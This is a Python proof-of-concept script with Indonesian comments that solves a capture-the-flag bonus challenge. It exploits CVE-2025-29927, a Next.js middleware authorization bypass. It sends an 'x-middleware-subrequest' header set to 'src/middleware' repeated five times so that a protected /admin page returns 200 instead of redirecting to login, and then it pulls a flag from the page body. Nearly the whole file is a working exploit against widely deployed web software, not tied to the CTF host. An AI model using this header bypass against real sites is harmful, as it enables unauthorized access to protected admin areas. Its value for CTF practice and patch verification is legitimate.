#!/usr/bin/env python3
"""
PoC - Sawit Lestari (SOAL BONUS TCC PENS)
CVE-2025-29927: Next.js 15.2.2 Middleware Authorization Bypass

/admin dijaga middleware (tanpa sesi -> 307 ke /login).
Next.js < 15.2.3 mempercayai header internal `x-middleware-subrequest`
dari client. Kalau nilainya berisi nama middleware yang diulang 5x
(MAX_RECURSION_DEPTH), Next mengira request ini subrequest internal
yang sudah berputar terlalu dalam, lalu MELEWATI middleware-nya.
Project ini memakai folder src/, jadi nama middleware-nya
`src/middleware` (varian `middleware`x5 tetap 307, sudah kucoba).

Pemakaian:
    python3 sawit.poc.py
    python3 sawit.poc.py http://chall.ctf.tccpens.id:30055
Output: perbandingan 307 (tanpa header) vs 200 (bypass), lalu flag.
"""
import re
import sys
import urllib.request
import urllib.error

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://chall.ctf.tccpens.id:30055").rstrip("/")
PAYLOAD = ":".join(["src/middleware"] * 5)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Jangan ikuti redirect, biar beda 307 vs 200 kelihatan."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


opener = urllib.request.build_opener(NoRedirect)


def get_admin(headers=None):
    req = urllib.request.Request(BASE + "/admin", headers=headers or {})
    try:
        with opener.open(req, timeout=15) as r:
            return r.status, r.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="ignore")


# 1. Baseline: tanpa header, middleware melempar aku ke /login
status, _ = get_admin()
print(f"[*] GET /admin tanpa header          -> {status} (redirect ke /login)")

# 2. Bypass: kirim header internal Next.js seolah subrequest middleware
status, body = get_admin({"x-middleware-subrequest": PAYLOAD})
print(f"[*] GET /admin + x-middleware-subrequest -> {status} (len={len(body)})")

if status != 200:
    sys.exit("[!] Bypass gagal - instance mungkin sudah dipatch/berbeda.")

# 3. Flag ada di dashboard pada bagian "Catatan audit internal".
#    React menyisipkan <!-- --> di antara potongan teks, bersihkan dulu.
clean = body.replace("<!-- -->", "")
m = re.search(r"IONIC\{[^}]+\}", clean)
print("[+] FLAG:", m.group(0) if m else "tidak ditemukan di body")
